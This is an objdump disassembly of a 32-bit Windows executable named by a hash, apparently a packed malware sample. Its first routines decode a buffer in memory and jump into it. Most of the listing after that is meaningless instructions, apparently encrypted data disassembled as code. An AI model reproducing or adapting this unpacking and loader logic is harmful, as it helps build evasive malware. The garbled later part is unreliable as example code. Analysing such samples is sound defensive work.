
743fa7a99cd143c41aa5c192a1485776c8751a301263fad7e42bebb0f3947995.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	sub    esp,0xf8
  411006:	push   esi
  411007:	mov    esi,DWORD PTR ds:0x42901c
  41100d:	push   edi
  41100e:	push   0x0
  411010:	push   0x80
  411015:	push   0x3
  411017:	push   0x0
  411019:	push   0x0
  41101b:	push   0x80000000
  411020:	push   0x429228
  411025:	call   esi
  411027:	mov    edi,eax
  411029:	cmp    edi,0xffffffff
  41102c:	mov    DWORD PTR [esp+0xc],edi
  411030:	je     0x41115f
  411036:	push   0x0
  411038:	push   0x80
  41103d:	push   0x4
  41103f:	push   0x0
  411041:	push   0x1
  411043:	push   0x4
  411045:	push   0x429220
  41104a:	call   esi
  41104c:	mov    esi,eax
  41104e:	cmp    esi,0xffffffff
  411051:	jne    0x411061
  411053:	pop    edi
  411054:	mov    eax,0x1
  411059:	pop    esi
  41105a:	add    esp,0xf8
  411060:	ret    
  411061:	push   ebx
  411062:	mov    ebx,DWORD PTR ds:0x429050
  411068:	push   ebp
  411069:	mov    ebp,DWORD PTR ds:0x429074
  41106f:	nop
  411070:	push   0x0
  411072:	lea    eax,[esp+0x14]
  411076:	push   eax
  411077:	push   0xc8
  41107c:	lea    ecx,[esp+0x4c]
  411080:	push   ecx
  411081:	push   edi
  411082:	call   DWORD PTR ds:0x429078
  411088:	test   eax,eax
  41108a:	je     0x4110d1
  41108c:	push   0x2
  41108e:	push   0x0
  411090:	push   0x0
  411092:	push   esi
  411093:	call   ebx
  411095:	mov    edx,DWORD PTR [esp+0x10]
  411099:	push   0x0
  41109b:	push   edx
  41109c:	push   0x0
  41109e:	mov    edi,eax
  4110a0:	push   edi
  4110a1:	push   esi
  4110a2:	call   ebp
  4110a4:	mov    ecx,DWORD PTR [esp+0x10]
  4110a8:	push   0x0
  4110aa:	lea    eax,[esp+0x1c]
  4110ae:	push   eax
  4110af:	push   ecx
  4110b0:	lea    edx,[esp+0x4c]
  4110b4:	push   edx
  4110b5:	push   esi
  4110b6:	call   DWORD PTR ds:0x429080
  4110bc:	mov    eax,DWORD PTR [esp+0x10]
  4110c0:	push   0x0
  4110c2:	push   eax
  4110c3:	push   0x0
  4110c5:	push   edi
  4110c6:	push   esi
  4110c7:	call   DWORD PTR ds:0x42907c
  4110cd:	mov    edi,DWORD PTR [esp+0x14]
  4110d1:	cmp    DWORD PTR [esp+0x10],0xc8
  4110d9:	je     0x411070
  4110db:	push   edi
  4110dc:	mov    edi,DWORD PTR ds:0x429084
  4110e2:	call   edi
  4110e4:	push   esi
  4110e5:	call   edi
  4110e7:	lea    ecx,[esp+0x1c]
  4110eb:	push   ecx
  4110ec:	call   DWORD PTR ds:0x42908c
  4110f2:	mov    ecx,DWORD PTR [esp+0x38]
  4110f6:	xor    edx,edx
  4110f8:	mov    eax,0x21c00
  4110fd:	div    ecx
  4110ff:	mov    edi,DWORD PTR ds:0x429154
  411105:	lea    edx,[esp+0x40]
  411109:	mov    ebx,ecx
  41110b:	mov    esi,eax
  41110d:	imul   esi,ecx
  411110:	push   esi
  411111:	push   0x4291e8
  411116:	push   edx
  411117:	call   edi
  411119:	xor    edx,edx
  41111b:	mov    eax,0x21c00
  411120:	div    ebx
  411122:	lea    eax,[esp+0x4c]
  411126:	add    edx,0x400
  41112c:	push   edx
  41112d:	push   0x4291c0
  411132:	push   eax
  411133:	call   edi
  411135:	push   0x22000
  41113a:	lea    ecx,[esp+0x5c]
  41113e:	push   0x429190
  411143:	push   ecx
  411144:	call   edi
  411146:	mov    edx,0x21c00
  41114b:	sub    edx,esi
  41114d:	push   edx
  41114e:	lea    eax,[esp+0x68]
  411152:	push   0x429168
  411157:	push   eax
  411158:	call   edi
  41115a:	add    esp,0x30
  41115d:	pop    ebp
  41115e:	pop    ebx
  41115f:	pop    edi
  411160:	xor    eax,eax
  411162:	pop    esi
  411163:	add    esp,0xf8
  411169:	ret    
  41116a:	nop
  41116b:	nop
  41116c:	nop
  41116d:	nop
  41116e:	nop
  41116f:	nop
  411170:	sub    esp,0x8
  411173:	push   ebx
  411174:	push   ebp
  411175:	mov    ebp,DWORD PTR [esp+0x20]
  411179:	push   esi
  41117a:	xor    eax,eax
  41117c:	push   edi
  41117d:	mov    edi,DWORD PTR [esp+0x1c]
  411181:	mov    DWORD PTR [esp+0x10],eax
  411185:	mov    esi,0xfffffffd
  41118a:	mov    DWORD PTR [esp+0x14],0x1
  411192:	mov    ecx,DWORD PTR [esp+0x20]
  411196:	mov    cl,BYTE PTR [ecx+esi*1+0x3]
  41119a:	add    esi,0x2
  41119d:	inc    esi
  41119e:	mov    BYTE PTR [esi+edi*1],cl
  4111a1:	movzx  ecx,BYTE PTR [eax+ebp*1]
  4111a5:	mov    edx,DWORD PTR [esp+0x10]
  4111a9:	mov    eax,DWORD PTR [esp+0x14]
  4111ad:	add    edx,eax
  4111af:	mov    DWORD PTR [esp+0x10],edx
  4111b3:	ror    eax,cl
  4111b5:	mov    eax,DWORD PTR [esp+0x10]
  4111b9:	mov    edx,eax
  4111bb:	shr    edx,0x3
  4111be:	mov    ebx,0x1
  4111c3:	sub    ebx,edx
  4111c5:	imul   eax,ebx
  4111c8:	mov    DWORD PTR [esp+0x10],eax
  4111cc:	shl    ebx,0x3
  4111cf:	mov    bl,BYTE PTR [esi+edi*1]
  4111d2:	add    bl,cl
  4111d4:	mov    ecx,DWORD PTR [esp+0x24]
  4111d8:	mov    BYTE PTR [esi+edi*1],bl
  4111db:	sub    esi,0x2
  4111de:	cmp    esi,ecx
  4111e0:	jl     0x411192
  4111e2:	pop    edi
  4111e3:	pop    esi
  4111e4:	pop    ebp
  4111e5:	pop    ebx
  4111e6:	add    esp,0x8
  4111e9:	ret    
  4111ea:	nop
  4111eb:	nop
  4111ec:	nop
  4111ed:	nop
  4111ee:	nop
  4111ef:	nop
  4111f0:	push   ebp
  4111f1:	mov    ebp,esp
  4111f3:	sub    esp,0x70
  4111f6:	mov    DWORD PTR [ebp-0x58],0x0
  4111fd:	mov    DWORD PTR [ebp-0x18],0x0
  411204:	mov    DWORD PTR [ebp-0x54],0x0
  41120b:	mov    DWORD PTR [ebp-0x4c],0x0
  411212:	mov    DWORD PTR [ebp-0x70],0x0
  411219:	mov    DWORD PTR [ebp-0x60],0x0
  411220:	mov    DWORD PTR [ebp-0x8],0x0
  411227:	mov    DWORD PTR [ebp-0x50],0x0
  41122e:	mov    DWORD PTR [ebp-0x48],0x0
  411235:	mov    DWORD PTR [ebp-0x6c],0x0
  41123c:	mov    DWORD PTR [ebp-0x30],0x0
  411243:	mov    DWORD PTR [ebp-0x4],0x0
  41124a:	mov    DWORD PTR [ebp-0x2c],0x0
  411251:	mov    DWORD PTR [ebp-0x14],0x0
  411258:	mov    DWORD PTR [ebp-0x10],0x0
  41125f:	mov    DWORD PTR [ebp-0x68],0x0
  411266:	mov    DWORD PTR [ebp-0x5c],0x0
  41126d:	mov    DWORD PTR [ebp-0xc],0x0
  411274:	mov    eax,ds:0x429254
  411279:	mov    DWORD PTR [ebp-0x28],eax
  41127c:	mov    ecx,DWORD PTR ds:0x429258
  411282:	mov    DWORD PTR [ebp-0x24],ecx
  411285:	mov    edx,DWORD PTR ds:0x42925c
  41128b:	mov    DWORD PTR [ebp-0x20],edx
  41128e:	mov    al,ds:0x429260
  411293:	mov    BYTE PTR [ebp-0x1c],al
  411296:	mov    ecx,DWORD PTR ds:0x429244
  41129c:	mov    DWORD PTR [ebp-0x40],ecx
  41129f:	mov    edx,DWORD PTR ds:0x429248
  4112a5:	mov    DWORD PTR [ebp-0x3c],edx
  4112a8:	mov    eax,ds:0x42924c
  4112ad:	mov    DWORD PTR [ebp-0x38],eax
  4112b0:	mov    cx,WORD PTR ds:0x429250
  4112b7:	mov    WORD PTR [ebp-0x34],cx
  4112bb:	mov    dl,BYTE PTR ds:0x429252
  4112c1:	mov    BYTE PTR [ebp-0x32],dl
  4112c4:	mov    DWORD PTR [ebp-0x30],0x40
  4112cb:	push   0xa
  4112cd:	call   DWORD PTR ds:0x429158
  4112d3:	lea    eax,[ebp-0x10]
  4112d6:	push   eax
  4112d7:	push   0x429230
  4112dc:	call   DWORD PTR ds:0x429004
  4112e2:	test   eax,eax
  4112e4:	je     0x41133c
  4112e6:	push   0x0
  4112e8:	push   0x0
  4112ea:	push   0x0
  4112ec:	call   DWORD PTR ds:0x429040
  4112f2:	mov    DWORD PTR [ebp-0x14],eax
  4112f5:	lea    ecx,[ebp-0x40]
  4112f8:	push   ecx
  4112f9:	lea    edx,[ebp-0x10]
  4112fc:	push   edx
  4112fd:	call   DWORD PTR ds:0x429000
  411303:	test   eax,eax
  411305:	je     0x41133c
  411307:	push   0x108a
  41130c:	push   0x3873f
  411311:	call   DWORD PTR ds:0x42903c
  411317:	mov    eax,DWORD PTR [ebp-0x10]
  41131a:	add    eax,0x1
  41131d:	mov    DWORD PTR [ebp-0x10],eax
  411320:	push   0x14
  411322:	push   0x0
  411324:	mov    ecx,DWORD PTR [ebp-0x14]
  411327:	push   ecx
  411328:	call   DWORD PTR ds:0x429038
  41132e:	push   0x0
  411330:	push   0x0
  411332:	mov    edx,DWORD PTR [ebp-0x14]
  411335:	push   edx
  411336:	call   DWORD PTR ds:0x429034
  41133c:	mov    BYTE PTR [ebp-0x40],0x56
  411340:	call   DWORD PTR ds:0x429030
  411346:	mov    DWORD PTR [ebp-0x2c],eax
  411349:	mov    BYTE PTR [ebp-0x3e],0x72
  41134d:	movzx  eax,WORD PTR [ebp-0x2c]
  411351:	cmp    eax,0x539
  411356:	jne    0x4113a4
  411358:	mov    BYTE PTR [ebp-0x34],0x0
  41135c:	mov    DWORD PTR [ebp-0x14],0xe0d
  411363:	lea    ecx,[ebp-0x28]
  411366:	push   ecx
  411367:	call   DWORD PTR ds:0x42902c
  41136d:	mov    DWORD PTR [ebp-0x60],eax
  411370:	mov    DWORD PTR [ebp-0x54],0x3a
  411377:	lea    edx,[ebp-0x40]
  41137a:	push   edx
  41137b:	mov    eax,DWORD PTR [ebp-0x60]
  41137e:	push   eax
  41137f:	call   DWORD PTR ds:0x429028
  411385:	mov    DWORD PTR [ebp-0x44],eax
  411388:	mov    DWORD PTR [ebp-0x8],0x3100cd52
  41138f:	push   0x0
  411391:	mov    ecx,DWORD PTR [ebp-0x70]
  411394:	push   ecx
  411395:	call   DWORD PTR ds:0x429014
  41139b:	mov    DWORD PTR [ebp-0x6c],0x110e87
  4113a2:	jmp    0x4113c5
  4113a4:	mov    BYTE PTR ds:0x448090,0x0
  4113ab:	mov    BYTE PTR ds:0x42e210,0x0
  4113b2:	push   0x0
  4113b4:	mov    edx,DWORD PTR [ebp-0x70]
  4113b7:	push   edx
  4113b8:	call   DWORD PTR ds:0x42914c
  4113be:	mov    BYTE PTR ds:0x446060,0x0
  4113c5:	push   DWORD PTR ds:0x42902c
  4113cb:	pop    edx
  4113cc:	mov    DWORD PTR [ebp-0x68],edx
  4113cf:	push   DWORD PTR [ebp-0x30]
  4113d2:	push   0x1000
  4113d7:	mov    eax,DWORD PTR [ebp-0x14]
  4113da:	add    eax,0x23
  4113dd:	add    eax,0x23
  4113e0:	push   eax
  4113e1:	xor    eax,eax
  4113e3:	push   eax
  4113e4:	mov    ecx,DWORD PTR [ebp-0x44]
  4113e7:	call   ecx
  4113e9:	push   eax
  4113ea:	pop    ecx
  4113eb:	mov    DWORD PTR [ebp-0x4],ecx
  4113ee:	mov    eax,DWORD PTR [ebp-0x6c]
  4113f1:	sub    eax,0xdae0b
  4113f6:	mov    DWORD PTR [ebp-0x6c],eax
  4113f9:	cmp    DWORD PTR [ebp-0x4],0x0
  4113fd:	jne    0x41140e
  4113ff:	push   0x0
  411401:	call   DWORD PTR ds:0x42900c
  411407:	mov    BYTE PTR ds:0x446060,0x0
  41140e:	mov    ecx,DWORD PTR [ebp-0x4]
  411411:	add    ecx,DWORD PTR [ebp-0x14]
  411414:	mov    edx,DWORD PTR [ebp-0x8]
  411417:	mov    DWORD PTR [ecx],edx
  411419:	mov    DWORD PTR [ebp-0x2c],0x410000
  411420:	mov    eax,DWORD PTR [ebp-0x60]
  411423:	push   eax
  411424:	call   DWORD PTR ds:0x429024
  41142a:	mov    ecx,DWORD PTR [ebp-0x4]
  41142d:	add    ecx,DWORD PTR [ebp-0x54]
  411430:	mov    DWORD PTR [ebp-0x5c],ecx
  411433:	mov    edx,DWORD PTR ds:0x429028
  411439:	mov    DWORD PTR [ebp-0x4c],edx
  41143c:	mov    eax,DWORD PTR [ebp-0x4]
  41143f:	add    eax,DWORD PTR [ebp-0x14]
  411442:	mov    ecx,DWORD PTR [ebp+0x8]
  411445:	mov    DWORD PTR [eax+0x4],ecx
  411448:	mov    edx,DWORD PTR [ebp-0x4]
  41144b:	add    edx,DWORD PTR [ebp-0x14]
  41144e:	mov    DWORD PTR [ebp-0xc],edx
  411451:	mov    eax,DWORD PTR [ebp-0x70]
  411454:	push   eax
  411455:	call   DWORD PTR ds:0x429150
  41145b:	cmp    DWORD PTR [ebp-0x6c],0x0
  41145f:	jbe    0x41147c
  411461:	mov    ecx,DWORD PTR [ebp-0xc]
  411464:	push   ecx
  411465:	mov    edx,DWORD PTR [ebp-0x14]
  411468:	push   edx
  411469:	mov    eax,DWORD PTR [ebp-0x2c]
  41146c:	add    eax,DWORD PTR [ebp-0x6c]
  41146f:	push   eax
  411470:	mov    ecx,DWORD PTR [ebp-0x4]
  411473:	push   ecx
  411474:	call   0x411170
  411479:	add    esp,0x10
  41147c:	call   DWORD PTR ds:0x429020
  411482:	cmp    DWORD PTR [ebp-0x5c],0x0
  411486:	je     0x411499
  411488:	push   DWORD PTR [ebp-0x4c]
  41148b:	push   DWORD PTR [ebp-0x68]
  41148e:	mov    edx,DWORD PTR [ebp-0x5c]
  411491:	push   eax
  411492:	jmp    edx
  411494:	jmp    0x422f7a
  411499:	mov    edx,DWORD PTR [ebp+0x8]
  41149c:	mov    DWORD PTR [ebp-0x18],edx
  41149f:	push   0x1
  4114a1:	mov    eax,DWORD PTR [ebp-0x70]
  4114a4:	push   eax
  4114a5:	call   DWORD PTR ds:0x429010
  4114ab:	fistp  DWORD PTR [edi+0x48]
  4114ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114af:	dec    eax
  4114b0:	sti    
  4114b1:	or     al,0x9b
  4114b3:	test   DWORD PTR [edx+0x5c4f3b45],0x195d4197
  4114bd:	xor    esp,0xa580dd00
  4114c3:	xor    dl,cl
  4114c5:	(bad)  
  4114c6:	rcr    DWORD PTR [ebx-0x16bf1e2e],1
  4114cc:	shl    BYTE PTR [ebp+0x35a12125],0x18
  4114d3:	mov    al,ds:0x17e571b2
  4114d8:	mov    es,edi
  4114da:	ficom  DWORD PTR [ebp+0x8]
  4114dd:	push   ebx
  4114de:	outs   dx,DWORD PTR ds:[esi]
  4114df:	in     al,dx
  4114e0:	std    
  4114e1:	stc    
  4114e2:	ds out 0xe1,eax
  4114e5:	push   edi
  4114e6:	jne    0x411563
  4114e8:	mov    ah,0x3e
  4114ea:	int    0xea
  4114ec:	in     al,0x3d
  4114ee:	test   al,0x6
  4114f0:	push   ss
  4114f1:	push   es
  4114f2:	enter  0x2577,0xb6
  4114f6:	sub    BYTE PTR [eax],ah
  4114f8:	adc    BYTE PTR [eax+0x55],dh
  4114fb:	sti    
  4114fc:	loopne 0x4114e6
  4114fe:	or     BYTE PTR [ecx-0x39],bl
  411501:	outs   dx,DWORD PTR ds:[esi]
  411502:	jns    0x4114a8
  411504:	int    0xc6
  411506:	(bad)  
  411507:	xchg   ebp,eax
  411508:	and    BYTE PTR [ebp-0x28bf8159],bh
  41150e:	and    eax,0x9073225b
  411513:	dec    ebx
  411514:	or     BYTE PTR [eax],dl
  411516:	jmp    0x5e3d:0x803a3f2a
  41151d:	mov    ds:0x3271fbce,eax
  411522:	in     eax,dx
  411523:	dec    eax
  411524:	push   0x999cc7a8
  411529:	scas   eax,DWORD PTR es:[edi]
  41152a:	imul   ebp,DWORD PTR [edx],0xfcf954b0
  411530:	or     edi,esp
  411532:	arpl   dx,di
  411534:	clc    
  411535:	mov    ebp,0x7f18f47a
  41153a:	sub    BYTE PTR [eax-0xc0b0ca8],0xe4
  411541:	nop
  411542:	out    0x1c,eax
  411544:	push   esp
  411545:	hlt    
  411546:	xlat   BYTE PTR ds:[ebx]
  411547:	and    edx,DWORD PTR [ecx+0x33ce175e]
  41154d:	fld    QWORD PTR [esi]
  41154f:	cmp    eax,0x2e225f9b
  411554:	dec    esi
  411555:	jle    0x41153a
  411557:	dec    esp
  411558:	xchg   esp,eax
  411559:	push   ss
  41155a:	mov    ecx,0x786ad22e
  41155f:	jp     0x411501
  411561:	std    
  411562:	call   0xd982:0x8a34cab2
  411569:	sbb    DWORD PTR [esi],esp
  41156b:	push   ecx
  41156c:	dec    esi
  41156d:	dec    ebp
  41156e:	adc    BYTE PTR [esi],0x70
  411571:	daa    
  411572:	mov    edi,0x7431ef2f
  411577:	xchg   al,al
  411579:	call   FWORD PTR [edx+ebp*4+0x736b9828]
  411580:	inc    esp
  411581:	push   ecx
  411582:	xrelease xchg DWORD PTR [edx+esi*2-0x24e92a58],ebx
  41158a:	mov    BYTE PTR [esi+0xf],al
  41158d:	mov    edx,0xf5a52b49
  411592:	mov    ecx,DWORD PTR [ebx-0xb]
  411595:	sbb    BYTE PTR [ebp+edx*1+0x24],bl
  411599:	ror    DWORD PTR [edx+ecx*4+0x14],1
  41159d:	test   eax,0xde5f5c67
  4115a2:	aaa    
  4115a3:	xchg   BYTE PTR [eax+0x46],ch
  4115a6:	cmp    BYTE PTR [esp+edx*2+0x7],dl
  4115aa:	and    DWORD PTR [eax*4-0x1808cddd],edi
  4115b1:	mov    BYTE PTR [eax],0xe0
  4115b4:	xchg   esi,eax
  4115b5:	scas   al,BYTE PTR es:[edi]
  4115b6:	pushf  
  4115b7:	xchg   edx,eax
  4115b8:	inc    esp
  4115b9:	sub    al,0xeb
  4115bb:	xlat   BYTE PTR ds:[ebx]
  4115bc:	jg     0x4115a9
  4115be:	mov    dh,0x7b
  4115c0:	aaa    
  4115c1:	enter  0xcb76,0xac
  4115c5:	push   eax
  4115c6:	ret    
  4115c7:	stos   BYTE PTR es:[edi],al
  4115c8:	fistp  QWORD PTR [ebx+0xdeca71b]
  4115ce:	jmp    0x93c5:0xad1b891a
  4115d5:	outs   dx,DWORD PTR ds:[esi]
  4115d6:	mov    eax,ds:0x18678bea
  4115db:	jbe    0x41163e
  4115dd:	je     0x4115b5
  4115df:	repnz cwde 
  4115e1:	lods   al,BYTE PTR ds:[esi]
  4115e2:	xchg   ecx,eax
  4115e3:	xor    eax,DWORD PTR [esi+eax*8+0x5]
  4115e7:	pop    edx
  4115e8:	imul   ecx,ecx,0x2
  4115eb:	sub    DWORD PTR [eax-0xc],edx
  4115ee:	mov    es,WORD PTR [ebp+0x45]
  4115f1:	mov    eax,0x11cbfb0d
  4115f6:	mov    al,ds:0x28b8c9a6
  4115fb:	or     eax,0x2a2a4bec
  411600:	push   esi
  411601:	retf   0x879e
  411604:	mul    BYTE PTR [ebx-0x30fdb99d]
  41160a:	inc    esi
  41160b:	aam    0x3c
  41160d:	sbb    edx,DWORD PTR [ebp-0x1a8f766]
  411613:	jno    0x41165c
  411615:	xchg   BYTE PTR [edx-0x4],cl
  411618:	fnsave [esi+0x76e4ce29]
  41161e:	mov    ebx,0x33af5999
  411623:	xor    DWORD PTR [eax-0x42db5967],ebp
  411629:	inc    esp
  41162a:	xor    al,0xc6
  41162d:	pop    DWORD PTR [edx-0x6c3423c3]
  411633:	xor    dl,dl
  411635:	adc    al,0xdb
  411637:	inc    ebx
  411638:	test   al,0xab
  41163a:	(bad)  
  41163b:	mov    edi,0xf58031c6
  411640:	push   es
  411641:	mov    edi,0x9de8488c
  411646:	fdivr  st,st(0)
  411648:	fwait
  411649:	mov    ds:0x64a59835,eax
  41164e:	sub    DWORD PTR ds:0xb7872aa2,0xffffffd4
  411655:	es sahf 
  411657:	in     al,0x15
  411659:	mov    fs,WORD PTR [ecx]
  41165b:	cmp    DWORD PTR [esi],ebp
  41165d:	out    dx,eax
  41165e:	xor    eax,0x7d783f52
  411663:	shr    DWORD PTR ds:0xa9e2473,cl
  411669:	out    dx,al
  41166a:	les    ebp,FWORD PTR [ebp+0x119ea82]
  411670:	xchg   esp,eax
  411671:	jl     0x411689
  411673:	and    cl,BYTE PTR [eax]
  411675:	fist   WORD PTR [ebp-0x56]
  411678:	lea    ebp,[edi-0x36]
  41167b:	sub    al,0x71
  41167d:	push   ds
  41167e:	fwait
  41167f:	or     dh,al
  411681:	push   ecx
  411682:	scas   al,BYTE PTR es:[edi]
  411683:	stos   BYTE PTR es:[edi],al
  411684:	pop    ebp
  411685:	push   ss
  411686:	js     0x41168c
  411688:	adc    DWORD PTR [edx+0x7a],0x6d154e2b
  41168f:	pop    esi
  411690:	push   ds
  411691:	scas   al,BYTE PTR es:[edi]
  411692:	adc    eax,0x10086391
  411697:	ror    BYTE PTR [ebp-0x36],0xe9
  41169b:	xchg   edx,eax
  41169c:	cmp    BYTE PTR [ecx-0x33c6d04a],0x8b
  4116a3:	fwait
  4116a4:	lea    ebx,[edi+ecx*1]
  4116a7:	cld    
  4116a8:	xchg   DWORD PTR [esp+esi*4-0x6e],esi
  4116ac:	mov    cl,0xd2
  4116ae:	inc    esp
  4116af:	pop    edi
  4116b0:	loope  0x4116f0
  4116b2:	push   esi
  4116b3:	push   esi
  4116b4:	dec    esi
  4116b5:	or     ah,dh
  4116b7:	mov    ebp,0x2d6592ff
  4116bc:	xchg   esp,eax
  4116bd:	adc    ebx,edx
  4116bf:	lods   al,BYTE PTR ds:[esi]
  4116c0:	fs or  bl,0x89
  4116c4:	mov    ebx,0x322a0dac
  4116c9:	out    0xff,eax
  4116cb:	nop
  4116cc:	out    dx,eax
  4116cd:	dec    ebx
  4116ce:	and    DWORD PTR [esi-0x11f51472],ecx
  4116d4:	out    dx,al
  4116d5:	add    dl,BYTE PTR [ecx]
  4116d7:	das    
  4116d8:	rol    DWORD PTR [edi],cl
  4116da:	rol    DWORD PTR [edi+0x2e0f03d3],cl
  4116e0:	and    bh,0x5a
  4116e3:	jle    0x4116c0
  4116e5:	sbb    dl,cl
  4116e7:	test   edi,esp
  4116e9:	fwait
  4116ea:	or     ch,BYTE PTR [esp+ebx*4-0x2cc8a4db]
  4116f1:	sub    BYTE PTR [eax+0x6ca65efc],dh
  4116f7:	ret    0x6c67
  4116fa:	mov    cl,dh
  4116fc:	outs   dx,DWORD PTR ds:[esi]
  4116fd:	xor    edi,DWORD PTR ds:0xeca9823b
  411703:	scas   eax,DWORD PTR es:[edi]
  411704:	mov    al,0x1a
  411706:	mov    bh,bh
  411708:	or     edx,DWORD PTR [edx+0x23]
  41170b:	fwait
  41170c:	xchg   edx,eax
  41170d:	sub    BYTE PTR [eax-0x61],0x17
  411711:	fs jg  0x411769
  411714:	push   cs
  411715:	push   0xffffff9e
  411717:	lea    edx,[edi]
  411719:	mov    dh,0x5f
  41171b:	outs   dx,DWORD PTR ds:[esi]
  41171c:	mov    ebp,edx
  41171e:	mov    bl,0xa3
  411720:	jo     0x4116e5
  411722:	scas   eax,DWORD PTR es:[di]
  411724:	xchg   edi,eax
  411725:	in     eax,0xa4
  411727:	xor    al,0xd4
  411729:	push   es
  41172a:	pop    es
  41172b:	add    BYTE PTR [ecx],bh
  41172d:	sub    eax,0x32cd15d7
  411732:	(bad)  
  411733:	xchg   edx,eax
  411734:	or     BYTE PTR [eax-0x3680efc1],dh
  41173a:	mov    ds:0x712fe672,al
  41173f:	xlat   BYTE PTR ds:[ebx]
  411740:	xadd   DWORD PTR [edi+0x116ac621],ecx
  411747:	sub    al,0xe0
  411749:	fisttp DWORD PTR [ebp+0x33]
  41174c:	ins    BYTE PTR es:[edi],dx
  41174d:	lds    esi,FWORD PTR [esi+0x740eacbf]
  411753:	mov    al,0x1b
  411755:	cmp    esp,DWORD PTR [esi+esi*8]
  411758:	mov    dh,0x2f
  41175a:	push   ds
  41175b:	loopne 0x4117b9
  41175d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41175e:	(bad)  
  41175f:	enter  0xf6da,0x2
  411763:	sbb    eax,0xb54f2bdd
  411768:	int    0xf2
  41176a:	sbb    eax,0x4a4bd7af
  41176f:	mov    eax,0xdb685dc0
  411774:	inc    ecx
  411775:	push   es
  411776:	dec    esi
  411777:	pop    ecx
  411778:	mov    al,0xf4
  41177a:	(bad)  
  41177b:	xor    eax,0xa9ea8022
  411780:	sub    DWORD PTR [edx],ebx
  411782:	dec    edi
  411783:	aas    
  411784:	repz cs mov ebp,0xcb124d48
  41178b:	repz or al,BYTE PTR [esi]
  41178e:	fmul   DWORD PTR [eax]
  411790:	sbb    ah,BYTE PTR [ebx]
  411792:	call   0xef6aee05
  411797:	cdq    
  411798:	lock cmc 
  41179a:	ins    BYTE PTR es:[edi],dx
  41179b:	cmp    bh,BYTE PTR [ebx]
  41179d:	bound  edi,QWORD PTR [eax]
  41179f:	ret    0x60ad
  4117a2:	(bad)  [edx]
  4117a4:	xchg   esi,eax
  4117a5:	imul   ecx,DWORD PTR ds:0x9560f421,0xd03a64b
  4117af:	fcomp  QWORD PTR [eax-0xd]
  4117b2:	jmp    0x73dc3ec7
  4117b7:	das    
  4117b8:	and    edi,ebp
  4117ba:	dec    edx
  4117bb:	add    DWORD PTR [ebx+ebp*4-0x25],eax
  4117bf:	je     0x411750
  4117c1:	and    BYTE PTR [edi-0x31],dh
  4117c4:	retf   
  4117c5:	add    DWORD PTR [ecx],eax
  4117c7:	loope  0x4117ed
  4117c9:	dec    eax
  4117ca:	add    al,0x8
  4117cc:	add    al,BYTE PTR [ecx+ecx*2-0x1e14053f]
  4117d3:	fnstsw WORD PTR [ebp-0x164afea0]
  4117d9:	pop    edi
  4117da:	inc    eax
  4117db:	retf   0xb502
  4117de:	mov    DWORD PTR [ecx+0x34d0acbb],eax
  4117e4:	into   
  4117e5:	or     DWORD PTR [ebp-0x5c28a4ce],0x9
  4117ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4117ed:	stc    
  4117ee:	dec    edx
  4117ef:	push   cs
  4117f0:	sub    eax,0x75fe7877
  4117f5:	cmp    al,0x25
  4117f7:	or     al,0xd1
  4117f9:	mov    bl,0x5e
  4117fb:	mov    BYTE PTR [eax-0xe],dl
  4117fe:	xor    BYTE PTR [ecx-0x26c85507],al
  411804:	jae    0x4117cb
  411806:	clc    
  411807:	stos   DWORD PTR es:[edi],eax
  411808:	pop    ebx
  411809:	mov    ds:0x4cb388aa,eax
  41180e:	fist   DWORD PTR [ebx+eax*8-0x2b7804e8]
  411815:	inc    ebp
  411816:	scas   eax,DWORD PTR es:[edi]
  411817:	mov    ah,bh
  411819:	mov    esi,0x2df62971
  41181e:	(bad)  
  41181f:	xchg   edx,eax
  411820:	fstp   QWORD PTR [edi]
  411822:	pop    edx
  411823:	bound  edi,QWORD PTR [ebp+0x5]
  411826:	jmp    0x466892c1
  41182b:	jge    0x4117be
  41182d:	test   BYTE PTR [eax],cl
  41182f:	mov    DWORD PTR [ecx+ecx*1+0x52c32a9e],edx
  411836:	pushf  
  411837:	call   0xf234:0xdf4583b8
  41183e:	sbb    cl,BYTE PTR [esp+eiz*4-0x7a]
  411842:	(bad)  
  411843:	scas   eax,DWORD PTR es:[edi]
  411844:	jnp    0x4117d8
  411846:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411847:	mov    ah,0xd1
  411849:	iret   
  41184a:	cmp    ah,dh
  41184c:	inc    ebx
  41184d:	(bad)  
  41184e:	pop    edi
  41184f:	sub    esi,DWORD PTR [edx]
  411851:	inc    ebx
  411852:	cs ins DWORD PTR es:[edi],dx
  411854:	pop    edx
  411855:	inc    ebp
  411856:	popf   
  411857:	dec    edx
  411858:	sbb    eax,0x4a55a679
  41185d:	bound  edx,QWORD PTR fs:0x2f649e24
  411864:	add    BYTE PTR [ebx+0x35a293c5],0xf4
  41186b:	or     eax,0xb3e0abbb
  411870:	mov    al,0x78
  411872:	mov    esp,0xc99751fc
  411877:	in     eax,0x3f
  411879:	xchg   edi,eax
  41187a:	mov    ecx,0x1158ff58
  41187f:	aad    0x80
  411881:	jecxz  0x411887
  411883:	pop    ebp
  411884:	jo     0x411878
  411886:	jg     0x411867
  411888:	jl     0x41181c
  41188a:	test   eax,0x1a7f7cf4
  41188f:	imul   edi,DWORD PTR [edx-0x14ddb461],0x2e
  411896:	jmp    0x42e:0x140ef39e
  41189d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41189e:	fcmove st,st(3)
  4118a0:	lods   eax,DWORD PTR ds:[esi]
  4118a1:	add    al,0x46
  4118a3:	mov    WORD PTR [edi+0x1],?
  4118a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4118a7:	in     eax,dx
  4118a8:	js     0x4118da
  4118aa:	ficom  WORD PTR [ebp-0x77ccd73]
  4118b0:	clc    
  4118b1:	dec    eax
  4118b2:	dec    edx
  4118b3:	push   edx
  4118b4:	jb     0x41191d
  4118b6:	xchg   esp,eax
  4118b7:	fiadd  DWORD PTR [ebp-0x77]
  4118ba:	xchg   edi,eax
  4118bb:	push   esi
  4118bc:	mov    BYTE PTR ds:0xc84e0165,0x7d
  4118c3:	fisttp QWORD PTR [ebp*1-0x7a36a842]
  4118ca:	mov    bh,0x82
  4118cc:	cmp    esi,esp
  4118ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4118cf:	inc    ebp
  4118d0:	inc    edx
  4118d1:	out    0x27,al
